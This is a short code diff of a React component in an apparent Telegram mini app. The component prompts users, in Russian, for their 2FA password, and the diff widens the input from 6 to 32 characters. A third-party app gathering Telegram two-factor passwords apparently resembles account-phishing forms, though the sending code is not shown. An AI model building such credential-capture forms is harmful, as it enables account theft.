@@ -9,7 +9,7 @@ export default function Auth2FA() {
   const tg = window.Telegram?.WebApp;
   const userId = tg?.initDataUnsafe?.user?.id;
 
-  const sendCode = async () => {
+  const Send2FA = async () => {
     if (!code.trim()) {
       alert("Введите ваш пароль 2FA");
       return;
@@ -56,13 +56,13 @@ export default function Auth2FA() {
         type="text"
         className="mt-6 px-6 py-3 rounded-xl bg-gray-700 text-white text-center text-xl outline-none"
         placeholder="Введите ваш пароль 2FA"
-        maxLength={6}
+        maxLength={32}
         value={code}
         onChange={(e) => setCode(e.target.value)}
       />
 
       <button
-        onClick={sendCode}
+        onClick={Send2FA}
         disabled={loading}
         className="bg-[#027ffe] mt-7 px-8 py-4 rounded-2xl text-white 
            hover:bg-[#026ee0] transition-colors duration-200 
